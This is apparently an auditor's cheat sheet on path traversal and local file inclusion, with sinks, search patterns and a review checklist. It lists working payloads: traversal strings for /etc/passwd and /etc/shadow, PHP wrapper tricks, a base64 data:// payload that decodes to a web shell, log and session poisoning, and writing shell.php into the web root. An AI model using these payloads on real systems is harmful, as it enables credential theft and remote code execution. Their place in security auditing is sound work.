# Path Traversal & LFI — Tactical Pillar

> **Context:** The application uses user-supplied input to construct a file path for reading, writing, or including.

---

## 1. Local File Inclusion (LFI)
Occurs in languages like PHP where the file content is *executed* by the engine.
- **Classic Sink:** `include()`, `require()`, `include_once()`.
- **Tactic:** `vuln.php?page=../../../../etc/passwd` or `vuln.php?page=php://filter/read=convert.base64-encode/resource=config.php`.
- **`grep_search`:** `include($_GET`, `require($`, `file_get_contents(`.

### LFI to RCE Chains
1. **Log Poisoning:** User injects PHP code into User-Agent or URL parameters. Code is saved in `access.log`. Attacker includes `access.log`.
2. **Session Poisoning:** User values saved in `/tmp/sess_ID`. Attacker includes session file.
3. **Wrapper Exploitation:** `expect://id`, `data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+`.

---

## 2. Directory/Path Traversal
Occurs in file serving, download, or upload endpoints where the file is read but not executed.
- **Classic Sink:** `fs.readFile()`, `sendFile()`, `FileInputStream`, `fopen()`.
- **Tactic:** Bypassing `basePath` concatenation. `path.join('/var/www/uploads', '../../../../etc/shadow')`.
- **Windows Targets:** `..\..\..\windows\system32\drivers\etc\hosts`.

---

## 3. Advanced Bypass Techniques
- **Double Encoding:** `..%252f` -> `..%2f` -> `../`.
- **Null Byte (Legacy):** `shell.php%00.jpg` to bypass extension checks in PHP < 5.3.
- **Overlong Paths:** `....//....//etc/passwd`.
- **URL Normalization Bypasses:** Using `\` on Windows or `/./` in Linux.

---

## 4. Path Injection in Write Operations
- **Scenario:** `save_config(filename, content)`.
- **Tactic:** Set `filename` to `../../../../var/www/html/shell.php`.
- **`grep_search`:** `writeFile(`, `move_uploaded_file(`, `SaveAs(`.

---

## Strategic Checklist for Auditor
1. [ ] Identify all endpoints that receive a "filename", "path", or "page" parameter.
2. [ ] Trace if the input is validated using `realpath()` and a prefix check.
3. [ ] Test for PHP Wrappers if the stack is PHP.
4. [ ] Check if the application runs with excessive permissions (e.g., as root).

---

*Tags: #path-traversal #lfi #file-inclusion #shiva-vault*
